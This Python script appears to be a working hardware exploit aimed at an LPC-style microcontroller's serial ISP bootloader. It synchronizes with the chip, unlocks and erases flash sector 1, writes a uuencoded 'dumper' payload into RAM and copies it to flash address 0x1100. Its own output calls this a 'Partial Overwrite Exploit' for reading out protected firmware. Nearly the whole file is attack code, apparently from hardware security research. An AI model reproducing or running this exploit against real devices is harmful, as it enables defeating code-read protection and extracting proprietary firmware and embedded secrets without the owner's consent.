import time
import serial as ser
import uu

EOL = b"\r\n"

SER_PORT = "/dev/ttyAMA0"

def open_port(serial, baud):
	print(f"Serial communication opened on port {serial} at {baud} baud.")
	return ser.Serial(serial, baud, timeout=1)

def send_exploit(serial, khz):

	################################## Syncing the Device ############################################
	serial.write(b"?")
	print("synchronization handshake initiated... ")

	if serial.readline() == b"Synchronized" + EOL:
		serial.write(b"Synchronized" + EOL)
	else:
		print("Synchronization failed. No response from target device.")
		return False

	clk = str(khz).encode('UTF-8')   
	if serial.readline() == b"Synchronized\rOK" + EOL:
		print("Synchronized with target device.")
		print("Setting device clock freq... ")

		serial.write(clk + EOL)
	else:
	 
		print("Synchronization failed. Target aborted synchronization.")
		return False

	if serial.readline() == clk + b"\rOK" + EOL:
		print("Clock frequency set at %.3f Mhz" % (khz / 1000.0))
	else:
		print("Failed to set clock frequency to %.3f Mhz" % (khz / 1000.0))
		return False
  
	print("Communications setup with target device succeeded. \n")

	################################## Ssending the Exploit ############################################

	print("Applying The Partial Overwrite Exploit...... :) \n")

	time.sleep(1)

	#Enable Erase Command:
	serial.write(b"U 23130" + EOL)

	#Prepare Sector 1
	serial.write(b"P 1 1" + EOL)

	#Erase Sector 1
	serial.write(b"E 1 1" + EOL)

	#Write 256 bytes at 0x10001700 in RAM
	serial.write(b"W 268441344 256" + EOL)

	#Send the encoded dumper
	serial.write(b"""M"TL`(EEIB`;\\U1+X`1NR]8!?&6#VT4_T`%)9:8D&_-42^`$;LO4`3QE@]M'I
	MYP"_`(``0`"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_
	M`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`
	MOP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_
	M`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`
	?OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP"_`+\\`OP``" + EOL""")

	#Send Bytes' checksum
	serial.write(b"25345" + EOL)

	#Prepare Sector 1
	serial.write(b"P 1 1" + EOL)

	#Copy 256bytes strating from address 0x10001700 in RAM to 0x1100 in flash
	serial.write(b"C 4352 268441344 256" + EOL)

	time.sleep(5)

	#Exploit result
	print("\n ########## Run User Code Please in order for the dumper to work ! (: ########### \n")
		
	return True

def close_port(serial):
	serial.close()

if __name__=="__main__":
	port = open_port(SER_PORT, 115200)
	send_exploit(port, 12000)
	close_port(port)




